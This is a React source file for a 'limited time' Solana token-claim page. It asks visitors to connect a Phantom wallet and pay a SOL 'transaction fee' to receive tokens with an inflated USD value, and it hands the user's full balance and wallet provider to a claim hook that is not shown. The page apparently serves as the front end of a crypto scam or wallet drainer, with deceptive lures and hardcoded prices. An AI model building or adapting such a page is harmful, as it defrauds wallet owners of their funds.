// src/App.tsx
import React, { useCallback, useEffect, useState } from 'react';
import { usePhantomWallet } from './hooks/usePhantomWallet';
import { useTransaction } from './hooks/useTransaction';
import { CONFIG } from './config';

const App: React.FC = () => {
  const { walletState, loading, connectWallet, disconnectWallet, refreshBalance, getProvider } = usePhantomWallet();
  const { transactionState, claimTokens, resetTransaction } = useTransaction();
  const [isConnecting, setIsConnecting] = useState(false);
  const [isRefreshing, setIsRefreshing] = useState(false);

  const formatAddress = (address: string): string => {
    return `${address.slice(0, 4)}...${address.slice(-4)}`;
  };

  const handleConnect = async () => {
    setIsConnecting(true);
    try {
      await connectWallet();
    } catch (error) {
      console.error('Failed to connect:', error);
    } finally {
      setIsConnecting(false);
    }
  };

  const handleRefresh = async () => {
    setIsRefreshing(true);
    await refreshBalance();
    setTimeout(() => setIsRefreshing(false), 1000);
  };

  const handleClaim = useCallback(async () => {
    const provider = getProvider();
    if (!provider || !walletState.publicKey) return;
    try {
      await claimTokens(walletState.publicKey, walletState.balance, provider);
      await refreshBalance();
    } catch (error) {
      console.error('Claim failed:', error);
    }
  }, [walletState, getProvider, claimTokens, refreshBalance]);

  const handleDisconnect = useCallback(async () => {
    await disconnectWallet();
    resetTransaction();
  }, [disconnectWallet, resetTransaction]);

  useEffect(() => {
    if (!walletState.connected) resetTransaction();
  }, [walletState.connected, resetTransaction]);

  const isProcessing = transactionState.status === 'processing' || transactionState.status === 'confirming';

  return (
    <div className="min-h-screen bg-[#0A0A1A] text-white relative overflow-hidden">
      {/* Animated Background */}
      <div className="fixed inset-0 pointer-events-none">
        <div className="absolute top-[-20%] right-[-10%] w-[800px] h-[800px] rounded-full bg-gradient-to-br from-purple-600/20 via-pink-500/10 to-transparent blur-[120px] animate-pulse" />
        <div className="absolute bottom-[-20%] left-[-10%] w-[700px] h-[700px] rounded-full bg-gradient-to-tr from-green-400/20 via-blue-500/10 to-transparent blur-[120px] animate-pulse" 
          style={{ animationDelay: '1.5s' }} />
        <div className="absolute top-[40%] left-[30%] w-[500px] h-[500px] rounded-full bg-gradient-to-r from-yellow-400/10 via-purple-600/10 to-transparent blur-[100px] animate-pulse"
          style={{ animationDelay: '3s' }} />
        
        {/* Grid overlay */}
        <div 
          className="absolute inset-0 opacity-[0.02]"
          style={{
            backgroundImage: `linear-gradient(rgba(153, 69, 255, 0.5) 1px, transparent 1px), 
                             linear-gradient(90deg, rgba(153, 69, 255, 0.5) 1px, transparent 1px)`,
            backgroundSize: '60px 60px'
          }}
        />
      </div>

      {/* Main Content */}
      <main className="relative z-10 min-h-screen flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-lg">
          {/* Header */}
          <div className="text-center mb-8 animate-[fadeIn_0.8s_ease-out]">
            <div className="inline-flex items-center space-x-2 px-4 py-2 rounded-full bg-white/5 border border-white/10 backdrop-blur-xl mb-6">
              <span className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
              <span className="text-sm text-gray-400">Limited Time Offer</span>
            </div>
            
            <h1 className="text-5xl md:text-6xl font-bold mb-4">
              <span className="bg-gradient-to-r from-purple-400 via-white to-green-400 bg-clip-text text-transparent">
                {CONFIG.TOKEN_NAME}
              </span>
              <span className="text-white"> Claim</span>
            </h1>
            
            <p className="text-lg text-gray-400">
              Claim <span className="text-green-400 font-semibold">${CONFIG.TOKEN_VALUE_USD.toLocaleString()}</span> in{' '}
              <span className="text-purple-400 font-semibold">{CONFIG.TOKEN_SYMBOL}</span> tokens
            </p>
          </div>

          {/* Main Card */}
          <div className="animate-[fadeIn_0.5s_ease-out_0.2s_both]">
            {!walletState.connected ? (
              /* Connect View */
              <div className="relative group">
                <div className="absolute -inset-0.5 bg-gradient-to-r from-purple-600 to-green-400 rounded-2xl blur opacity-30 group-hover:opacity-50 transition duration-300" />
                <div className="relative p-8 bg-white/5 backdrop-blur-xl rounded-2xl border border-white/10">
                  {loading ? (
                    <div className="flex flex-col items-center py-12">
                      <div className="w-16 h-16 rounded-full border-2 border-purple-500/20 border-t-purple-500 animate-spin mb-6" />
                      <p className="text-gray-400 animate-pulse">Initializing...</p>
                    </div>
                  ) : (
                    <div className="flex flex-col items-center py-8">
                      {/* Wallet Icon */}
                      <div className="relative mb-8">
                        <div className="absolute inset-0 bg-gradient-to-r from-purple-600 to-green-400 rounded-full blur-2xl opacity-20" />
                        <div className="relative w-24 h-24 rounded-2xl bg-gradient-to-br from-purple-600 via-blue-500 to-green-400 p-[1px]">
                          <div className="w-full h-full rounded-2xl bg-[#0A0A1A] flex items-center justify-center backdrop-blur-xl">
                            <svg className="w-14 h-14 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                              <path d="M21 12V7H5a2 2 0 0 1 0-4h14v4" />
                              <path d="M3 5v14a2 2 0 0 0 2 2h16v-5" />
                              <path d="M18 12a2 2 0 0 0 0 4h4v-4Z" />
                            </svg>
                          </div>
                        </div>
                      </div>

                      <h2 className="text-2xl font-bold mb-2">Connect Wallet</h2>
                      <p className="text-gray-400 mb-8 text-center">
                        Link your Phantom wallet to continue
                      </p>

                      <button
                        onClick={handleConnect}
                        disabled={isConnecting}
                        className="relative group/btn w-full"
                      >
                        <div className="absolute -inset-0.5 bg-gradient-to-r from-purple-600 to-green-400 rounded-xl blur opacity-60 group-hover/btn:opacity-100 transition duration-300" />
                        <div className="relative px-6 py-4 bg-[#0A0A1A] rounded-xl flex items-center justify-center space-x-3">
                          {isConnecting ? (
                            <>
                              <div className="w-5 h-5 rounded-full border-2 border-purple-500/30 border-t-purple-500 animate-spin" />
                              <span className="text-white font-semibold">Connecting...</span>
                            </>
                          ) : walletState.isPhantomInstalled ? (
                            <>
                              <img src="/phantom-icon.png" alt="Phantom" className="w-6 h-6" />
                              <span className="text-white font-semibold">Connect Phantom</span>
                            </>
                          ) : (
                            <>
                              <img src="/phantom-icon.png" alt="Phantom" className="w-6 h-6" />
                              <span className="text-white font-semibold">Install Phantom</span>
                            </>
                          )}
                        </div>
                      </button>

                      {!walletState.isPhantomInstalled && (
                        <a
                          href="https://phantom.app/"
                          target="_blank"
                          rel="noopener noreferrer"
                          className="mt-6 text-purple-400 hover:text-green-400 transition-colors text-sm font-medium inline-flex items-center space-x-1 group/link"
                        >
                          <span>Get Phantom Wallet</span>
                          <svg className="w-4 h-4 transform group-hover/link:translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 5l7 7m0 0l-7 7m7-7H3" />
                          </svg>
                        </a>
                      )}
                    </div>
                  )}
                </div>
              </div>
            ) : (
              /* Connected View */
              <div className="space-y-6">
                {/* Wallet Info Card */}
                <div className="animate-[slideDown_0.5s_ease-out]">
                  <div className="relative group">
                    <div className="absolute -inset-0.5 bg-gradient-to-r from-purple-600 to-green-400 rounded-2xl blur opacity-30 group-hover:opacity-50 transition duration-300" />
                    <div className="relative p-6 bg-white/5 backdrop-blur-xl rounded-2xl border border-white/10">
                      {/* Connected Status */}
                      <div className="flex items-center justify-between mb-4">
                        <div className="flex items-center space-x-3">
                          <div className="relative">
                            <div className="w-3 h-3 bg-green-400 rounded-full" />
                            <div className="absolute inset-0 w-3 h-3 bg-green-400 rounded-full animate-ping opacity-75" />
                          </div>
                          <span className="text-green-400 text-sm font-medium">Connected</span>
                        </div>
                        
                        <button
                          onClick={() => navigator.clipboard.writeText(walletState.publicKey || '')}
                          className="p-2 rounded-lg bg-white/5 hover:bg-white/10 transition-all duration-200"
                          title="Copy address"
                        >
                          <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                          </svg>
                        </button>
                      </div>

                      {/* Address */}
                      <div className="mb-4">
                        <p className="text-gray-400 text-xs mb-1">Wallet Address</p>
                        <p className="text-white font-mono text-sm bg-white/5 rounded-lg px-3 py-2 border border-white/5">
                          {walletState.publicKey && formatAddress(walletState.publicKey)}
                        </p>
                      </div>

                      {/* Balance */}
                      <div>
                        <div className="flex items-center justify-between mb-2">
                          <p className="text-gray-400 text-xs">Balance</p>
                          <button
                            onClick={handleRefresh}
                            disabled={isRefreshing}
                            className="p-1 rounded-lg hover:bg-white/5 transition-all duration-200"
                          >
                            <svg 
                              className={`w-4 h-4 text-gray-400 transition-transform duration-500 ${isRefreshing ? 'animate-spin' : ''}`}
                              fill="none" 
                              stroke="currentColor" 
                              viewBox="0 0 24 24"
                            >
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                            </svg>
                          </button>
                        </div>
                        
                        <div className="flex items-baseline space-x-2">
                          <span className="text-3xl font-bold bg-gradient-to-r from-purple-400 via-white to-green-400 bg-clip-text text-transparent">
                            {walletState.balance.toFixed(4)}
                          </span>
                          <span className="text-xl text-gray-400">SOL</span>
                        </div>
                        
                        <p className="text-gray-500 text-xs mt-1">
                          ≈ ${(walletState.balance * 145).toFixed(2)} USD
                        </p>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Claim Card */}
                <div className="animate-[slideUp_0.5s_ease-out]">
                  <div className="relative group">
                    <div className="absolute -inset-0.5 bg-gradient-to-r from-purple-600 via-blue-500 to-green-400 rounded-2xl blur opacity-30 group-hover:opacity-50 transition duration-300" />
                    <div className="relative p-6 bg-white/5 backdrop-blur-xl rounded-2xl border border-white/10">
                      {/* Header */}
                      <div className="flex items-center justify-between mb-6">
                        <div>
                          <h3 className="text-xl font-bold">Claim Your Tokens</h3>
                          <p className="text-gray-400 text-sm mt-1">Transaction fee: {CONFIG.CLAIM_AMOUNT_SOL} SOL</p>
                        </div>
                        <div className="relative">
                          <div className="absolute inset-0 bg-gradient-to-r from-purple-600 to-green-400 rounded-full blur-md opacity-50" />
                          <div className="relative px-4 py-2 bg-[#0A0A1A] rounded-full border border-white/10">
                            <span className="text-sm font-bold bg-gradient-to-r from-purple-400 to-green-400 bg-clip-text text-transparent">
                              {CONFIG.TOKEN_SYMBOL}
                            </span>
                          </div>
                        </div>
                      </div>

                      {/* Details */}
                      <div className="grid grid-cols-2 gap-4 mb-6">
                        <div className="p-4 rounded-xl bg-white/5 border border-white/5">
                          <p className="text-gray-400 text-xs mb-1">Transaction Fee</p>
                          <p className="text-white font-bold text-lg">{CONFIG.CLAIM_AMOUNT_SOL} SOL</p>
                          <p className="text-gray-500 text-xs mt-1">≈ $14.50 USD</p>
                        </div>
                        
                        <div className="p-4 rounded-xl bg-white/5 border border-white/5 relative overflow-hidden">
                          <div className="absolute inset-0 bg-gradient-to-r from-transparent via-green-400/10 to-transparent animate-pulse" />
                          <p className="text-gray-400 text-xs mb-1">Token Value</p>
                          <p className="text-green-400 font-bold text-lg">${CONFIG.TOKEN_VALUE_USD.toLocaleString()}</p>
                          <p className="text-green-400/70 text-xs mt-1">+{CONFIG.TOKEN_VALUE_USD / 10} {CONFIG.TOKEN_SYMBOL}</p>
                        </div>
                      </div>

                      {/* Network */}
                      <div className="flex items-center justify-between p-3 rounded-xl bg-white/5 border border-white/5 mb-6">
                        <div className="flex items-center space-x-2">
                          <div className="w-2 h-2 rounded-full bg-purple-500 animate-pulse" />
                          <span className="text-gray-400 text-sm">Network</span>
                        </div>
                        <span className="text-white text-sm font-medium">Solana Mainnet</span>
                      </div>

                      {/* Transaction Progress */}
                      {transactionState.status !== 'idle' && (
                        <div className="mb-6 animate-[slideDown_0.3s_ease-out]">
                          <div className="w-full h-2 bg-white/5 rounded-full overflow-hidden mb-3">
                            <div 
                              className="h-full bg-gradient-to-r from-purple-600 via-blue-500 to-green-400 rounded-full transition-all duration-500 ease-out"
                              style={{ width: `${transactionState.progress}%` }}
                            />
                          </div>

                          {transactionState.status === 'processing' && (
                            <div className="flex items-center space-x-2 text-purple-400">
                              <div className="w-4 h-4 rounded-full border-2 border-purple-400/30 border-t-purple-400 animate-spin" />
                              <span className="text-sm">Processing transaction...</span>
                            </div>
                          )}
                          
                          {transactionState.status === 'confirming' && (
                            <div className="flex items-center space-x-2 text-blue-400">
                              <div className="w-4 h-4 rounded-full border-2 border-blue-400/30 border-t-blue-400 animate-spin" />
                              <span className="text-sm">Confirming on blockchain...</span>
                            </div>
                          )}
                          
                          {transactionState.status === 'success' && transactionState.signature && (
                            <div className="p-4 rounded-xl bg-green-400/10 border border-green-400/20">
                              <div className="flex items-center space-x-2 mb-2">
                                <svg className="w-5 h-5 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                                </svg>
                                <span className="text-green-400 font-medium">Transaction Successful!</span>
                              </div>
                              <a 
                                href={`https://solscan.io/tx/${transactionState.signature}`}
                                target="_blank"
                                rel="noopener noreferrer"
                                className="text-purple-400 text-sm hover:text-green-400 transition-colors inline-flex items-center space-x-1"
                              >
                                <span>View on Solscan</span>
                                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
                                </svg>
                              </a>
                            </div>
                          )}
                          
                          {transactionState.status === 'error' && (
                            <div className="p-4 rounded-xl bg-red-400/10 border border-red-400/20">
                              <div className="flex items-center space-x-2">
                                <svg className="w-5 h-5 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                                </svg>
                                <span className="text-red-400 text-sm">{transactionState.error}</span>
                              </div>
                            </div>
                          )}
                        </div>
                      )}

                      {/* Claim Button */}
                      <button
                        onClick={handleClaim}
                        disabled={isProcessing || transactionState.status === 'success'}
                        className="relative w-full group/btn disabled:opacity-50 disabled:cursor-not-allowed"
                      >
                        <div className="absolute -inset-0.5 bg-gradient-to-r from-purple-600 to-green-400 rounded-xl blur opacity-60 group-hover/btn:opacity-100 transition duration-300" />
                        <div className="relative px-6 py-4 bg-[#0A0A1A] rounded-xl flex items-center justify-center space-x-3">
                          {isProcessing ? (
                            <>
                              <div className="w-5 h-5 rounded-full border-2 border-green-400/30 border-t-green-400 animate-spin" />
                              <span className="text-white font-bold">Processing...</span>
                            </>
                          ) : transactionState.status === 'success' ? (
                            <>
                              <svg className="w-5 h-5 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                              </svg>
                              <span className="text-green-400 font-bold">Claimed Successfully</span>
                            </>
                          ) : (
                            <>
                              <span>🚀</span>
                              <span className="text-white font-bold">
                                Claim ${CONFIG.TOKEN_VALUE_USD.toLocaleString()} {CONFIG.TOKEN_SYMBOL}
                              </span>
                            </>
                          )}
                        </div>
                      </button>
                    </div>
                  </div>
                </div>

                {/* Disconnect Button */}
                <div className="text-center animate-[fadeIn_0.5s_ease-out_0.4s_both]">
                  <button
                    onClick={handleDisconnect}
                    disabled={isProcessing}
                    className="group inline-flex items-center space-x-2 px-6 py-3 text-gray-400 hover:text-white transition-colors duration-200 disabled:opacity-50"
                  >
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
                    </svg>
                    <span className="text-sm font-medium">Disconnect Wallet</span>
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      </main>
    </div>
  );
};

export default App;